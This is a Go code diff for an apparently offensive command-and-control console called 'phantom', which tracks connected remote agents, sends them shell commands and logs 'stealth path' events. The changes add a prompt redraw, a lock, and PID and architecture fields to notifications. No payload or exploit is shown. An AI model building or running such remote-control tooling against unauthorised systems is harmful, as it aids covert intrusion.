@@ -17,6 +17,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"runtime"
 	"strings"
 	"sync"
 	"syscall"
@@ -35,6 +36,7 @@ var (
 	activePeerID string
 	peerMutex    sync.Mutex
 	consoleMode  bool
+	promptLock   sync.Mutex
 )
 
 type crlfWriter struct {
@@ -42,6 +44,9 @@ type crlfWriter struct {
 }
 
 func (w *crlfWriter) Write(p []byte) (n int, err error) {
+	promptLock.Lock()
+	defer promptLock.Unlock()
+
 	buf := make([]byte, 0, len(p)*2)
 	for i := 0; i < len(p); i++ {
 		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
@@ -50,7 +55,27 @@ func (w *crlfWriter) Write(p []byte) (n int, err error) {
 			buf = append(buf, p[i])
 		}
 	}
-	return w.writer.Write(buf)
+
+	n, err = w.writer.Write(buf)
+
+	// Asynchronous Prompt Redraw
+	if consoleMode {
+		prompt := "phantom> "
+		peerMutex.Lock()
+		currentPeerID := activePeerID
+		peerMutex.Unlock()
+
+		if currentPeerID != "" {
+			shortID := currentPeerID
+			if len(shortID) > 13 {
+				shortID = shortID[:13]
+			}
+			prompt = fmt.Sprintf("phantom(%s)> ", shortID)
+		}
+		fmt.Print(prompt)
+	}
+
+	return n, err
 }
 
 func init() {
@@ -124,6 +149,8 @@ func backgroundPacketProcessor(peerID string, conn net.Conn, remoteAddr string) 
 				IP:            remoteAddr,
 				StealthPath:   payload,
 				ActionDetails: fmt.Sprintf("Real-time event captured by agent monitor"),
+				PID:           os.Getpid(),
+				Arch:          runtime.GOARCH,
 			})
 			if err != nil {
 				logger.Printf("[ERROR] Failed to send notification: %v", err)
@@ -249,6 +276,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		conn.Close()
 		return
 	}
+	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
 
 	// Explicit TLS Handshake for early error detection
 	if tlsConn, ok := conn.(*tls.Conn); ok {
@@ -303,6 +331,8 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		IP:            remoteAddr,
 		StealthPath:   "N/A",
 		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
+		PID:           0,
+		Arch:          "N/A",
 	})
 
 	registry.UpdatePeerState(peerID, peer.PeerStateAuthenticated)
@@ -560,6 +590,8 @@ func readCommandResponseWithMode(conn net.Conn, shellMode bool) {
 				IP:            "127.0.0.1",
 				StealthPath:   "N/A",
 				ActionDetails: payload,
+				PID:           os.Getpid(),
+				Arch:          runtime.GOARCH,
 			})
 			continue
 		}
